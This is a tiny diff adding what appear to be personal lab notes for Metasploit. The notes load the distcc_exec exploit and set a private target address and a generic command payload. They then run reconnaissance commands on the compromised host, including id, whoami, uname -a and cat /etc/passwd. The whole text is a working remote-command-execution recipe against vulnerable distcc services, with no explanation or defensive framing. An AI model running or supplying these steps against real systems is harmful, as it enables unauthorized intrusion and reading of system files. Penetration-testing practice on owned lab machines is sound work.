@@ -1,0 +1,12 @@
+use exploit/unix/misc/distcc_exec
+set RHOSTS 10.0.2.5
+set PAYLOAD cmd/unix/generic
+
+set CMD id
+run
+
+try other command 
+
+set CMD whoami
+set CMD cat /etc/passwd
+set CMD uname -a
